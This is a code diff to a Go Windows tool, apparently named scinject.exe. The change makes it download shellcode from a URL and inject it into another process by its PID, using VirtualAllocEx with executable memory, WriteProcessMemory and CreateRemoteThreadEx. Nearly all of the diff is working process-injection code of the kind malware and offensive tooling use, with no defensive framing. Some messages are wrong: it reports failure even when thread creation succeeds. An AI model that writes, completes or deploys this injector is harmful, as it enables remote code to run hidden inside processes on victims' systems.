@@ -9,6 +9,7 @@ import (
 	"strconv"
 
 	"golang.org/x/sys/windows"
+	"unsafe"
 )
 
 func xor(b, k []byte) ([]byte, error) {
@@ -37,33 +38,27 @@ func main() {
 
 	// key := byte(333)
 
-	if len(os.Args) < 2 {
+	if flag.NArg() < 1 {
 		fmt.Println("Error: Missing PID Arg. Usage: scinject.exe <PID>")
 		os.Exit(1)
 	}
 
-	/* Path to shellcode */
-	// create flag "-f" its should take a filepath to shellcode
-
-	var scFilePath string
-	flag.StringVar(&scFilePath, "f", "", "Path to shellcode")
+	var url string
+	flag.StringVar(&url, "url", "", "url to shellcode")
 
 	flag.Parse()
 
-	sc, err := fetchPayload(scFilePath)
+	if url == "" {
+		fmt.Println("No URL provided")
+	}
+
+	sc, err := fetchPayload(url)
 	if err != nil {
-		fmt.Printf("Error: fileread failure: %v\n", err)
+		fmt.Printf("Error: fetch failure: %v\n", err)
 		os.Exit(1)
 	}
 
-	// Errh: validate flag input
-
-	// if _, ok := scFilePath.(string); !ok {
-	// flag.Usage()
-	// os.Exit(1)
-	// }
-
-	pid, err := strconv.ParseUint((os.Args[1]), 10, 32)
+	pid, err := strconv.ParseUint(flag.Arg(0), 10, 32)
 	if err != nil {
 		fmt.Printf("Error parsing PID %v\n", err)
 		os.Exit(1)
@@ -94,13 +89,39 @@ func main() {
 		)
 	*/
 
-	r1, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
+	rAddr, _, err := pVirtualAllocEx.Call(uintptr(hProcess),
 		uintptr(0),
 		uintptr(len(sc)),
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		uintptr(windows.PAGE_EXECUTE_READWRITE))
-	if r1 == 0 {
+	if rAddr == 0 {
 		fmt.Println(err)
 	}
 
+	/* write to buffer */
+	err = windows.WriteProcessMemory(hProcess, rAddr, &sc[0], uintptr(len(sc)), nil)
+	if err != nil {
+		fmt.Printf("WriteProcessMemeory failed: %v\n", err)
+		os.Exit(1)
+	}
+
+	/* creating threads */
+	pCreateRemoteThreadEx := kernel32dll.NewProc("CreateRemoteThreadEx")
+
+	var tid uint32
+	hThread, _, err := pCreateRemoteThreadEx.Call(uintptr(hProcess),
+		uintptr(0),
+		uintptr(0),
+		rAddr,
+		uintptr(0),
+		uintptr(0),
+		uintptr(0),
+		uintptr(unsafe.Pointer(&tid)))
+
+	if hThread == 0 {
+		fmt.Printf("CreateRemoteThreadEx failed: %v\n", err)
+		os.Exit(1)
+
+	}
+	fmt.Printf("CreateRemoteThreadEx failed: %v\n", err)
 }
